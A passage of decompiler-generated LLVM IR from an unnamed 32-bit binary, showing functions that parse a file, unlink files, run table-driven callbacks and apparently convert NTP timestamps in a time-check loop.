dec_label_pc_4025dc.backedge:                     ; preds = %dec_label_pc_402550.thread, %dec_label_pc_4025b8, %dec_label_pc_402488, %dec_label_pc_40255c, %dec_label_pc_402550, %dec_label_pc_40257c
  store i32 %v2_4025dc, i32* %v0.global-to-local, align 4
  %v3_4025ec = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_4230f0.1 to i32), i32 -32300) to i32*), align 4
  store i32 %v3_4025ec, i32* %v0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_4025ec)
  %v0_402604 = load i32, i32* %v0.global-to-local, align 4
  %v1_402604 = icmp eq i32 %v0_402604, 0
  br i1 %v1_402604, label %dec_label_pc_402608, label %dec_label_pc_402488

dec_label_pc_4024d4:                              ; preds = %dec_label_pc_4024c4, %dec_label_pc_402528
  %storemerge116 = phi i32 [ %v1_402530, %dec_label_pc_402528 ], [ 0, %dec_label_pc_4024c4 ]
  %v2_4024e0 = add i32 %storemerge116, %v2_4025dc
  %v1_4024e8 = inttoptr i32 %v2_4024e0 to i8*
  %v3_4024f8 = load i32, i32* @global_var_41b23c.50, align 4
  store i32 %v3_4024f8, i32* %v0.global-to-local, align 4
  %v9_402504 = call i32 (i8*, i8*, ...) @sscanf(i8* %v1_4024e8, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_40a768.49, i32 0, i32 0), i32* nonnull %stack_var_-284)
  store i32 1, i32* %v0.global-to-local, align 4
  %v2_402518 = icmp eq i32 %v9_402504, 1
  br i1 %v2_402518, label %dec_label_pc_402550, label %dec_label_pc_402528

dec_label_pc_402528:                              ; preds = %dec_label_pc_4024d4
  %v1_402530 = add nuw nsw i32 %storemerge116, 1
  %v2_402544 = icmp slt i32 %v1_402530, %v4_40249c
  %v3_402544 = zext i1 %v2_402544 to i32
  store i32 %v3_402544, i32* %v0.global-to-local, align 4
  br i1 %v2_402544, label %dec_label_pc_4024d4, label %dec_label_pc_402550

dec_label_pc_402550:                              ; preds = %dec_label_pc_4024d4, %dec_label_pc_402528
  %v3_402550.pr = load i32, i32* %stack_var_-284, align 4
  store i32 %v3_402550.pr, i32* %v0.global-to-local, align 4
  %v1_402558 = icmp eq i32 %v3_402550.pr, 0
  br i1 %v1_402558, label %dec_label_pc_4025dc.backedge, label %dec_label_pc_40255c

dec_label_pc_40255c:                              ; preds = %dec_label_pc_402550
  %v3_402564 = load i32, i32* %stack_var_-292, align 4
  store i32 %v3_402564, i32* %v0.global-to-local, align 4
  %v2_40256c = icmp eq i32 %v3_402550.pr, %v3_402564
  br i1 %v2_40256c, label %dec_label_pc_4025dc.backedge, label %dec_label_pc_40257c

dec_label_pc_40257c:                              ; preds = %dec_label_pc_40255c
  %v3_402588 = load i32, i32* @global_var_41b124.43, align 4
  %v1_4025a0 = urem i32 %v3_402588, 256
  %v1_4025a4 = xor i32 %v1_4025a0, 1
  store i32 %v1_4025a4, i32* %v0.global-to-local, align 4
  %v1_4025a8 = icmp eq i32 %v1_4025a4, 0
  br i1 %v1_4025a8, label %dec_label_pc_4025b8, label %dec_label_pc_4025dc.backedge

dec_label_pc_4025b8:                              ; preds = %dec_label_pc_40257c
  %v3_4025c4 = load i32, i32* @global_var_41b128.44, align 4
  store i32 %v3_4025c4, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_4025dc.backedge

dec_label_pc_402608:                              ; preds = %dec_label_pc_4025dc.backedge, %dec_label_pc_4025dc.preheader
  %v3_402610 = load i32, i32* @global_var_41b21c.34, align 4
  store i32 %v3_402610, i32* %v0.global-to-local, align 4
  %v4_40261c = call i32 @fclose(%_IO_FILE* nonnull %v7_402460)
  store i32 %v4_40261c, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_402628

dec_label_pc_402628:                              ; preds = %dec_label_pc_402440, %dec_label_pc_402608
  %v3_402630 = load i32, i32* @global_var_41b250.37, align 4
  store i32 %v3_402630, i32* %v0.global-to-local, align 4
  %v4_40263c = call i32 @unlink(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_40a758.47, i32 0, i32 0))
  store i32 %v4_40263c, i32* %v0.global-to-local, align 4
  %v3_402658.pre = load i32, i32* %stack_var_-292, align 4
  br label %dec_label_pc_402688

dec_label_pc_402688.thread:                       ; preds = %dec_label_pc_402380
  store i32 0, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_40273c

dec_label_pc_402688:                              ; preds = %dec_label_pc_402628, %dec_label_pc_4023fc
  %v3_402658 = phi i32 [ %v3_402658.pre, %dec_label_pc_402628 ], [ %v0_402418, %dec_label_pc_4023fc ]
  store i32 %v3_402658, i32* %v0.global-to-local, align 4
  %v3_40266c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_4230f0.1 to i32), i32 -32704) to i32*), align 4
  %v1_402684 = trunc i32 %v3_40266c to i8
  %v4_402688 = urem i32 %v3_40266c, 256
  store i32 %v4_402688, i32* %v0.global-to-local, align 4
  %v1_402690 = icmp eq i8 %v1_402684, 0
  br i1 %v1_402690, label %dec_label_pc_40273c, label %dec_label_pc_402718.preheader

dec_label_pc_402718.preheader:                    ; preds = %dec_label_pc_402688
  store i32 1, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_402728

dec_label_pc_4026a4:                              ; preds = %dec_label_pc_402728
  %v2_4026b8 = mul nuw nsw i32 %storemerge13, 12
  %v2_4026c0 = add i32 %v2_4026b8, ptrtoint ([4 x i8]** @global_var_41b030.52 to i32)
  store i32 %v2_4026c0, i32* %v0.global-to-local, align 4
  %v1_4026c8 = add i32 %v2_4026b8, add (i32 ptrtoint ([4 x i8]** @global_var_41b030.52 to i32), i32 4)
  %v2_4026c8 = inttoptr i32 %v1_4026c8 to i32*
  %v3_4026c8 = load i32, i32* %v2_4026c8, align 4
  store i32 %v3_4026c8, i32* %v0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_4026c8)
  %v0_4026f4 = load i32, i32* %v0.global-to-local, align 4
  %v1_4026f4 = urem i32 %v0_4026f4, 256
  %v1_4026fc = icmp eq i32 %v1_4026f4, 1
  %stack_var_-312.3. = select i1 %v1_4026fc, i8 %stack_var_-312.312, i8 0
  %v1_402710 = add nuw nsw i32 %storemerge13, 1
  %v1_402720 = icmp slt i32 %v1_402710, 3
  %v2_402720 = zext i1 %v1_402720 to i32
  store i32 %v2_402720, i32* %v0.global-to-local, align 4
  %v1_402724 = icmp eq i1 %v1_402720, false
  br i1 %v1_402724, label %dec_label_pc_40273c, label %dec_label_pc_402728

dec_label_pc_402728:                              ; preds = %dec_label_pc_402718.preheader, %dec_label_pc_4026a4
  %storemerge13 = phi i32 [ 0, %dec_label_pc_402718.preheader ], [ %v1_402710, %dec_label_pc_4026a4 ]
  %stack_var_-312.312 = phi i8 [ %v1_402684, %dec_label_pc_402718.preheader ], [ %stack_var_-312.3., %dec_label_pc_4026a4 ]
  %v4_40272c = zext i8 %stack_var_-312.312 to i32
  store i32 %v4_40272c, i32* %v0.global-to-local, align 4
  %v1_402734 = icmp eq i8 %stack_var_-312.312, 0
  br i1 %v1_402734, label %dec_label_pc_40273c, label %dec_label_pc_4026a4

dec_label_pc_40273c:                              ; preds = %dec_label_pc_402728, %dec_label_pc_4026a4, %dec_label_pc_402688.thread, %dec_label_pc_402688
  %stack_var_-312.4 = phi i8 [ 0, %dec_label_pc_402688 ], [ 0, %dec_label_pc_402688.thread ], [ %stack_var_-312.3., %dec_label_pc_4026a4 ], [ 0, %dec_label_pc_402728 ]
  %v4_40273c = zext i8 %stack_var_-312.4 to i32
  store i32 %v4_40273c, i32* %v0.global-to-local, align 4
  ret i32 %v4_40273c

; uselistorder directives
  uselistorder i32 %v1_402710, { 1, 0 }
  uselistorder i32 %v1_4025a4, { 1, 0 }
  uselistorder i32 %v3_402550.pr, { 2, 0, 1 }
  uselistorder i32 %v1_402530, { 1, 0 }
  uselistorder i32 %storemerge116, { 1, 0 }
  uselistorder i32 %v4_40249c, { 1, 0, 2, 3 }
  uselistorder i32 %v2_4025dc, { 1, 2, 0 }
  uselistorder i32* %v0.global-to-local, { 8, 9, 10, 11, 12, 13, 2, 14, 15, 1, 17, 16, 28, 18, 22, 23, 24, 25, 26, 27, 29, 19, 20, 21, 7, 3, 30, 31, 5, 6, 4, 32, 33, 34, 35, 36, 0, 37, 38, 39, 40, 41, 42 }
  uselistorder i32 (%_IO_FILE*)* @fclose, { 3, 2, 1, 0 }
  uselistorder i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_40a758.47, i32 0, i32 0), { 1, 0 }
  uselistorder label %dec_label_pc_40273c, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_402728, { 1, 0 }
  uselistorder label %dec_label_pc_402628, { 1, 0 }
  uselistorder label %dec_label_pc_402550, { 1, 0 }
  uselistorder label %dec_label_pc_4024d4, { 1, 0 }
  uselistorder label %dec_label_pc_4025dc.backedge, { 1, 5, 3, 4, 0, 2 }
  uselistorder label %dec_label_pc_402488, { 1, 0 }
}

define i32 @function_402758(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_402758:
  %stack_var_0 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_0, align 4
  br label %dec_label_pc_402778

dec_label_pc_402778:                              ; preds = %dec_label_pc_402758, %dec_label_pc_402868
  %storemerge1 = phi i32 [ 0, %dec_label_pc_402758 ], [ %v1_402870, %dec_label_pc_402868 ]
  %v2_40278c = mul nuw nsw i32 %storemerge1, 12
  %v1_402794 = add i32 %v2_40278c, add (i32 ptrtoint (i32* @global_var_41b054.53 to i32), i32 4)
  %v2_402794 = inttoptr i32 %v1_402794 to i32*
  %v3_402794 = load i32, i32* %v2_402794, align 4
  %v1_40279c = icmp eq i32 %v3_402794, 0
  br i1 %v1_40279c, label %dec_label_pc_402778.dec_label_pc_40280c_crit_edge, label %dec_label_pc_4027a0

dec_label_pc_402778.dec_label_pc_40280c_crit_edge: ; preds = %dec_label_pc_402778
  %v3_402828.pre = load i32, i32* %stack_var_0, align 4
  br label %dec_label_pc_40280c

dec_label_pc_4027a0:                              ; preds = %dec_label_pc_402778
  %v2_402790 = add i32 %v2_40278c, ptrtoint (i32* @global_var_41b054.53 to i32)
  %v3_4027c0 = load i32, i32* %v2_402794, align 4
  %v3_4027c4 = load i32, i32* %stack_var_0, align 4
  %v2_4027cc = sub i32 %v3_4027c4, %v3_4027c0
  %v1_4027f0 = inttoptr i32 %v2_402790 to i32*
  %v2_4027f0 = load i32, i32* %v1_4027f0, align 4
  %v2_4027f8 = icmp ult i32 %v2_4027cc, %v2_4027f0
  %v1_4027fc = icmp eq i1 %v2_4027f8, false
  br i1 %v1_4027fc, label %dec_label_pc_40280c, label %dec_label_pc_402868

dec_label_pc_40280c:                              ; preds = %dec_label_pc_402778.dec_label_pc_40280c_crit_edge, %dec_label_pc_4027a0
  %v3_402828 = phi i32 [ %v3_402828.pre, %dec_label_pc_402778.dec_label_pc_40280c_crit_edge ], [ %v3_4027c4, %dec_label_pc_4027a0 ]
  store i32 %v3_402828, i32* %v2_402794, align 4
  %v1_402854 = add i32 %v2_40278c, add (i32 ptrtoint (i32* @global_var_41b054.53 to i32), i32 8)
  %v2_402854 = inttoptr i32 %v1_402854 to i32*
  %v3_402854 = load i32, i32* %v2_402854, align 4
  call void @__pseudo_call(i32 %v3_402854)
  br label %dec_label_pc_402868

dec_label_pc_402868:                              ; preds = %dec_label_pc_4027a0, %dec_label_pc_40280c
  %v1_402870 = add nuw nsw i32 %storemerge1, 1
  %v1_402880 = icmp slt i32 %v1_402870, 3
  br i1 %v1_402880, label %dec_label_pc_402778, label %dec_label_pc_402888

dec_label_pc_402888:                              ; preds = %dec_label_pc_402868
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_40278c, { 2, 1, 0 }
  uselistorder i32 %storemerge1, { 1, 0 }
  uselistorder i32* %stack_var_0, { 1, 0, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_41b054.53 to i32), { 2, 0, 1 }
  uselistorder label %dec_label_pc_402868, { 1, 0 }
  uselistorder label %dec_label_pc_40280c, { 1, 0 }
  uselistorder label %dec_label_pc_402778, { 1, 0 }
}

define i32 @function_4028a4() local_unnamed_addr {
dec_label_pc_4028a4:
  br label %dec_label_pc_4028d0

dec_label_pc_4028d0:                              ; preds = %dec_label_pc_4028a4, %dec_label_pc_4028d0
  %storemerge12 = phi i32 [ 2, %dec_label_pc_4028a4 ], [ %v1_402928, %dec_label_pc_4028d0 ]
  %v2_4028e4 = mul nuw nsw i32 %storemerge12, 12
  %v1_4028f8 = add i32 %v2_4028e4, add (i32 ptrtoint ([4 x i8]** @global_var_41b030.52 to i32), i32 8)
  %v2_4028f8 = inttoptr i32 %v1_4028f8 to i32*
  %v3_4028f8 = load i32, i32* %v2_4028f8, align 4
  call void @__pseudo_call(i32 %v3_4028f8)
  %v1_402928 = add nsw i32 %storemerge12, -1
  %v1_402938 = icmp sgt i32 %storemerge12, 0
  br i1 %v1_402938, label %dec_label_pc_4028d0, label %dec_label_pc_40293c

dec_label_pc_40293c:                              ; preds = %dec_label_pc_4028d0
  %v4_402954 = call i32 @unlink(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_40a72c.41, i32 0, i32 0))
  ret i32 %v4_402954

; uselistorder directives
  uselistorder i32 %storemerge12, { 0, 2, 1 }
  uselistorder i32 (i8*)* @unlink, { 2, 1, 0 }
  uselistorder label %dec_label_pc_4028d0, { 1, 0 }
}

define i32 @function_402978(i32 %arg1) local_unnamed_addr {
dec_label_pc_402978:
  store i8 1, i8* @global_var_41b320.54, align 1
  ret i32 ptrtoint (i32* @global_var_420000.2 to i32)
}

define i32 @main(i32 %argc, i8** %argv) local_unnamed_addr {
entry:
  %v0.global-to-local = alloca i32, align 4
  %v3_402a08 = load i32, i32* @global_var_41b13c.57, align 4
  store i32 %v3_402a08, i32* %v0.global-to-local, align 4
  %v1_402a20 = icmp eq i32 %v3_402a08, 0
  br i1 %v1_402a20, label %dec_label_pc_402bc4, label %dec_label_pc_402a24

dec_label_pc_402a24:                              ; preds = %entry
  %v2_402a28 = call i32 @function_4022f0(i32 15, i32 4204920)
  store i32 %v2_402a28, i32* %v0.global-to-local, align 4
  %v1_402a34 = icmp eq i32 %v2_402a28, 0
  br i1 %v1_402a34, label %dec_label_pc_402ba0, label %dec_label_pc_402a60.preheader

dec_label_pc_402a60.preheader:                    ; preds = %dec_label_pc_402a24
  %v3_402a645 = load i8, i8* @global_var_41b320.54, align 1
  %v4_402a646 = zext i8 %v3_402a645 to i32
  %v1_402a6c7 = xor i32 %v4_402a646, 1
  store i32 %v1_402a6c7, i32* %v0.global-to-local, align 4
  %v1_402a748 = icmp eq i32 %v1_402a6c7, 0
  br i1 %v1_402a748, label %dec_label_pc_402b70.preheader.thread, label %dec_label_pc_402a78.lr.ph

dec_label_pc_402b70.preheader.thread:             ; preds = %dec_label_pc_402a60.preheader
  store i32 0, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_402b8c

dec_label_pc_402a78.lr.ph:                        ; preds = %dec_label_pc_402a60.preheader
  %v3_402a7c.pre = load i32, i32* @global_var_41b144.59, align 4
  store i32 %v3_402a7c.pre, i32* %v0.global-to-local, align 4
  %v1_402a84 = inttoptr i32 %v3_402a7c.pre to i32*
  %v2_402a8417 = load i32, i32* %v1_402a84, align 4
  store i32 %v2_402a8417, i32* %v0.global-to-local, align 4
  %v1_402a8c18 = icmp eq i32 %v2_402a8417, 0
  br i1 %v1_402a8c18, label %dec_label_pc_402a44, label %dec_label_pc_402b70.preheader

dec_label_pc_402a44:                              ; preds = %dec_label_pc_402a78.lr.ph, %dec_label_pc_402a44
  store i32 %v3_402a7c.pre, i32* %v0.global-to-local, align 4
  %v2_402a84 = load i32, i32* %v1_402a84, align 4
  store i32 %v2_402a84, i32* %v0.global-to-local, align 4
  %v1_402a8c = icmp eq i32 %v2_402a84, 0
  br i1 %v1_402a8c, label %dec_label_pc_402a44, label %dec_label_pc_402b70.preheader

dec_label_pc_402b70.preheader:                    ; preds = %dec_label_pc_402a44, %dec_label_pc_402a78.lr.ph
  store i32 %v1_402a6c7, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_402a9c

dec_label_pc_402a9c:                              ; preds = %dec_label_pc_402b70.preheader, %dec_label_pc_402b54
  %v3_402a9c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_4230f0.1 to i32), i32 -32292) to i32*), align 4
  store i32 %v3_402a9c, i32* %v0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_402a9c)
  %v0_402abc = load i32, i32* %v0.global-to-local, align 4
  %v3_402ae0 = load i32, i32* @global_var_41b144.59, align 4
  store i32 %v3_402ae0, i32* %v0.global-to-local, align 4
  %v1_402ae8 = inttoptr i32 %v3_402ae0 to i32*
  %v2_402ae8 = load i32, i32* %v1_402ae8, align 4
  store i32 %v2_402ae8, i32* %v0.global-to-local, align 4
  %v3_402af4 = call i32 @function_402758(i32 %v2_402ae8, i32 %v0_402abc, i32 21)
  %v3_402b04 = load i32, i32* @global_var_41b144.59, align 4
  store i32 %v3_402b04, i32* %v0.global-to-local, align 4
  %v1_402b0c = inttoptr i32 %v3_402b04 to i32*
  %v2_402b0c = load i32, i32* %v1_402b0c, align 4
  %v2_402b18 = icmp ult i32 %v2_402b0c, 34128000
  %v3_402b18 = zext i1 %v2_402b18 to i32
  store i32 %v3_402b18, i32* %v0.global-to-local, align 4
  br i1 %v2_402b18, label %dec_label_pc_402b2c, label %dec_label_pc_402b8c

dec_label_pc_402b2c:                              ; preds = %dec_label_pc_402a9c
  %v3_402b2c = load i32, i32* @global_var_41b148.61, align 4
  store i32 %v3_402b2c, i32* %v0.global-to-local, align 4
  %v1_402b34 = inttoptr i32 %v3_402b2c to i32*
  %v2_402b34 = load i32, i32* %v1_402b34, align 4
  %v2_402b40 = icmp ult i32 %v2_402b34, 1544432400
  %v3_402b40 = zext i1 %v2_402b40 to i32
  store i32 %v3_402b40, i32* %v0.global-to-local, align 4
  br i1 %v2_402b40, label %dec_label_pc_402b54, label %dec_label_pc_402b8c

dec_label_pc_402b54:                              ; preds = %dec_label_pc_402b2c
  %v3_402b74 = load i8, i8* @global_var_41b320.54, align 1
  %v4_402b74 = zext i8 %v3_402b74 to i32
  %v1_402b7c = xor i32 %v4_402b74, 1
  store i32 %v1_402b7c, i32* %v0.global-to-local, align 4
  %v1_402b84 = icmp eq i32 %v1_402b7c, 0
  br i1 %v1_402b84, label %dec_label_pc_402b8c, label %dec_label_pc_402a9c

dec_label_pc_402b8c:                              ; preds = %dec_label_pc_402a9c, %dec_label_pc_402b2c, %dec_label_pc_402b54, %dec_label_pc_402b70.preheader.thread
  %v0_402b8c = call i32 @function_4028a4()
  store i32 %v0_402b8c, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_402bac

dec_label_pc_402ba0:                              ; preds = %dec_label_pc_402a24
  store i32 ptrtoint (i32* @global_var_420000.2 to i32), i32* %v0.global-to-local, align 4
  store i8 1, i8* @global_var_41b320.54, align 1
  br label %dec_label_pc_402bac

dec_label_pc_402bac:                              ; preds = %dec_label_pc_402b8c, %dec_label_pc_402ba0
  %v3_402bac = load i32, i32* @global_var_41b14c.62, align 4
  store i32 %v3_402bac, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_402bc4

dec_label_pc_402bc4:                              ; preds = %entry, %dec_label_pc_402bac
  %v3_402bc8 = load i8, i8* @global_var_41b320.54, align 1
  %v4_402bc8 = zext i8 %v3_402bc8 to i32
  %v1_402bd0 = xor i32 %v4_402bc8, 1
  store i32 %v1_402bd0, i32* %v0.global-to-local, align 4
  %v1_402bd8 = icmp eq i32 %v1_402bd0, 0
  br i1 %v1_402bd8, label %dec_label_pc_402bf8, label %dec_label_pc_402bdc

dec_label_pc_402bdc:                              ; preds = %dec_label_pc_402bc4
  %v3_402be0 = load i32, i32* @global_var_41b150.63, align 4
  store i32 %v3_402be0, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_402bf8

dec_label_pc_402bf8:                              ; preds = %dec_label_pc_402bc4, %dec_label_pc_402bdc
  store i32 0, i32* %v0.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32* %v1_402a84, { 1, 0 }
  uselistorder i32 %v3_402a7c.pre, { 2, 1, 0 }
  uselistorder i32* %v0.global-to-local, { 6, 13, 14, 15, 16, 22, 17, 18, 19, 20, 21, 23, 7, 8, 9, 1, 10, 11, 4, 3, 5, 2, 0, 12 }
  uselistorder i32* @global_var_41b144.59, { 1, 2, 0 }
  uselistorder i8* @global_var_41b320.54, { 4, 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_402bf8, { 1, 0 }
  uselistorder label %dec_label_pc_402bc4, { 1, 0 }
  uselistorder label %dec_label_pc_402bac, { 1, 0 }
  uselistorder label %dec_label_pc_402b8c, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_402a9c, { 1, 0 }
  uselistorder label %dec_label_pc_402a44, { 1, 0 }
}

define i32 @function_402c20(i32 %arg1) local_unnamed_addr {
dec_label_pc_402c20:
  %v1_402d502 = add i32 %arg1, 12
  %v2_402d503 = inttoptr i32 %v1_402d502 to i32*
  %v3_402d504 = load i32, i32* %v2_402d503, align 4
  %v2_402d585 = icmp eq i32 %v3_402d504, 1
  br i1 %v2_402d585, label %dec_label_pc_402c48.lr.ph, label %dec_label_pc_402d5c

dec_label_pc_402c48.lr.ph:                        ; preds = %dec_label_pc_402c20
  br label %dec_label_pc_402c48

dec_label_pc_402c48:                              ; preds = %dec_label_pc_402c48.lr.ph, %dec_label_pc_402c48
  %v3_402c78 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_420000.2 to i32), i32 -19664) to i32*), align 4
  %v1_402c80 = add i32 %v3_402c78, 1
  store i32 %v1_402c80, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_420000.2 to i32), i32 -19664) to i32*), align 4
  %v3_402cec = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_420000.2 to i32), i32 -19660) to i32*), align 4
  %v1_402cf4 = add i32 %v3_402cec, 1
  store i32 %v1_402cf4, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_420000.2 to i32), i32 -19660) to i32*), align 4
  %v3_402d50 = load i32, i32* %v2_402d503, align 4
  %v2_402d58 = icmp eq i32 %v3_402d50, 1
  br i1 %v2_402d58, label %dec_label_pc_402c48, label %dec_label_pc_402d5c

dec_label_pc_402d5c:                              ; preds = %dec_label_pc_402c48, %dec_label_pc_402c20
  ret i32 0

; uselistorder directives
  uselistorder label %dec_label_pc_402c48, { 1, 0 }
}

define i32 @function_402d98(i32* %arg1) local_unnamed_addr {
dec_label_pc_402d98:
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_0 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  store i32 %tmp, i32* %stack_var_0, align 4
  %v2_402e6c = ptrtoint i32* %stack_var_-56 to i32
  %v1_402f90 = add i32 %v2_402e6c, 40
  %v2_402f90 = inttoptr i32 %v1_402f90 to i32*
  br label %dec_label_pc_403054

dec_label_pc_402dcc:                              ; preds = %dec_label_pc_403054
  %v1_402dd4 = add nsw i32 %stack_var_-88.01, -1
  %v3_402e08 = load i32, i32* @global_var_41b164.69, align 4
  %v1_402e2c = icmp slt i32 %v3_402e08, 0
  br i1 %v1_402e2c, label %dec_label_pc_403070, label %dec_label_pc_402e30

dec_label_pc_402e30:                              ; preds = %dec_label_pc_402dcc
  store i32 35, i32* %stack_var_-56, align 4
  %v3_402e90 = load i32, i32* @global_var_41b168.70, align 4
  %v1_402ea8 = icmp eq i32 %v3_402e90, 0
  br i1 %v1_402ea8, label %dec_label_pc_402ee8, label %dec_label_pc_402eac

dec_label_pc_402eac:                              ; preds = %dec_label_pc_402e30
  br label %dec_label_pc_402ee8

dec_label_pc_402ee8:                              ; preds = %dec_label_pc_402eac, %dec_label_pc_402e30
  %v3_402f10 = load i32, i32* @global_var_41b170.72, align 4
  %v2_402f30 = icmp eq i32 %v3_402f10, 48
  br i1 %v2_402f30, label %dec_label_pc_402f34, label %dec_label_pc_40300c

dec_label_pc_402f34:                              ; preds = %dec_label_pc_402ee8
  %v3_402f60 = load i32, i32* @global_var_41b174.73, align 4
  %v2_402f80 = icmp eq i32 %v3_402f60, 48
  br i1 %v2_402f80, label %dec_label_pc_402f84, label %dec_label_pc_40300c

dec_label_pc_402f84:                              ; preds = %dec_label_pc_402f34
  %v3_402f90 = load i32, i32* %v2_402f90, align 4
  %v2_402fdc = call i32 @llvm.bswap.i32(i32 %v3_402f90)
  %v2_402ff0 = add i32 %v2_402fdc, 2085978496
  %v3_402ff8 = load i32, i32* %stack_var_0, align 4
  %v2_403000 = inttoptr i32 %v3_402ff8 to i32*
  store i32 %v2_402ff0, i32* %v2_403000, align 4
  br label %dec_label_pc_40300c

dec_label_pc_40300c:                              ; preds = %dec_label_pc_402f34, %dec_label_pc_402ee8, %dec_label_pc_402f84
  %stack_var_-84.0 = phi i8 [ 1, %dec_label_pc_402f84 ], [ %stack_var_-84.12, %dec_label_pc_402f34 ], [ %stack_var_-84.12, %dec_label_pc_402ee8 ]
  %v1_403050 = icmp eq i32 %v1_402dd4, 0
  br i1 %v1_403050, label %dec_label_pc_403070, label %dec_label_pc_403054

dec_label_pc_403054:                              ; preds = %dec_label_pc_402d98, %dec_label_pc_40300c
  %stack_var_-84.12 = phi i8 [ 0, %dec_label_pc_402d98 ], [ %stack_var_-84.0, %dec_label_pc_40300c ]
  %stack_var_-88.01 = phi i32 [ 5, %dec_label_pc_402d98 ], [ %v1_402dd4, %dec_label_pc_40300c ]
  %v1_403068 = icmp eq i8 %stack_var_-84.12, 1
  br i1 %v1_403068, label %dec_label_pc_403070, label %dec_label_pc_402dcc

dec_label_pc_403070:                              ; preds = %dec_label_pc_403054, %dec_label_pc_40300c, %dec_label_pc_402dcc
  %stack_var_-84.1.lcssa = phi i8 [ %stack_var_-84.12, %dec_label_pc_403054 ], [ %stack_var_-84.0, %dec_label_pc_40300c ], [ %stack_var_-84.12, %dec_label_pc_402dcc ]
  %v4_403070 = zext i8 %stack_var_-84.1.lcssa to i32
  ret i32 %v4_403070

; uselistorder directives
  uselistorder i8 %stack_var_-84.12, { 4, 3, 0, 1, 2 }
  uselistorder i8 %stack_var_-84.0, { 1, 0 }
  uselistorder i32 %v1_402dd4, { 1, 0 }
  uselistorder label %dec_label_pc_403054, { 1, 0 }
  uselistorder label %dec_label_pc_40300c, { 2, 0, 1 }
}

define i32 @function_40308c(i32 %arg1) local_unnamed_addr {
dec_label_pc_40308c:
  %stack_var_0 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_0, align 4
  %v1_4031d02 = add i32 %arg1, 12
  %v2_4031d03 = inttoptr i32 %v1_4031d02 to i32*
  %v3_4031d04 = load i32, i32* %v2_4031d03, align 4
  %v2_4031d85 = icmp eq i32 %v3_4031d04, 1
  br i1 %v2_4031d85, label %dec_label_pc_4030b8.lr.ph, label %dec_label_pc_4031dc

dec_label_pc_4030b8.lr.ph:                        ; preds = %dec_label_pc_40308c
  br label %dec_label_pc_4030b8

dec_label_pc_4030b8:                              ; preds = %dec_label_pc_4030b8.lr.ph, %dec_label_pc_4031ac
  %v3_4031c89 = phi i32 [ %arg1, %dec_label_pc_4030b8.lr.ph ], [ %v3_4031c8, %dec_label_pc_4031ac ]
  %stack_var_-16.16 = phi i32 [ 0, %dec_label_pc_4030b8.lr.ph ], [ %stack_var_-16.0, %dec_label_pc_4031ac ]
  %v1_4030c0 = icmp eq i32 %stack_var_-16.16, 0
  br i1 %v1_4030c0, label %dec_label_pc_4030e8, label %dec_label_pc_4030c4

dec_label_pc_4030c4:                              ; preds = %dec_label_pc_4030b8
  %v3_4030cc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_420000.2 to i32), i32 -19660) to i32*), align 4
  %v2_4030d8 = sub i32 %v3_4030cc, %stack_var_-16.16
  %v1_4030dc = icmp ult i32 %v2_4030d8, 3600
  br i1 %v1_4030dc, label %dec_label_pc_4031ac, label %dec_label_pc_4030e8

dec_label_pc_4030e8:                              ; preds = %dec_label_pc_4030c4, %dec_label_pc_4030b8
  %v2_4030f0 = call i32 @function_402d98(i32* nonnull %stack_var_-12)
  %v1_4030fc = urem i32 %v2_4030f0, 256
  %v1_403104 = icmp eq i32 %v1_4030fc, 1
  br i1 %v1_403104, label %dec_label_pc_403130, label %dec_label_pc_403108

dec_label_pc_403108:                              ; preds = %dec_label_pc_4030e8
  %v3_403120 = call i32 @time(i32* nonnull %stack_var_-12)
  br label %dec_label_pc_403130

dec_label_pc_403130:                              ; preds = %dec_label_pc_4030e8, %dec_label_pc_403108
  %v3_40315c = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_40315c, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_420000.2 to i32), i32 -19664) to i32*), align 4
  %v3_4031a0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_420000.2 to i32), i32 -19660) to i32*), align 4
  %v3_4031c8.pre = load i32, i32* %stack_var_0, align 4
  br label %dec_label_pc_4031ac

dec_label_pc_4031ac:                              ; preds = %dec_label_pc_4030c4, %dec_label_pc_403130
  %v3_4031c8 = phi i32 [ %v3_4031c8.pre, %dec_label_pc_403130 ], [ %v3_4031c89, %dec_label_pc_4030c4 ]
  %stack_var_-16.0 = phi i32 [ %v3_4031a0, %dec_label_pc_403130 ], [ %stack_var_-16.16, %dec_label_pc_4030c4 ]
  %v1_4031d0 = add i32 %v3_4031c8, 12
  %v2_4031d0 = inttoptr i32 %v1_4031d0 to i32*
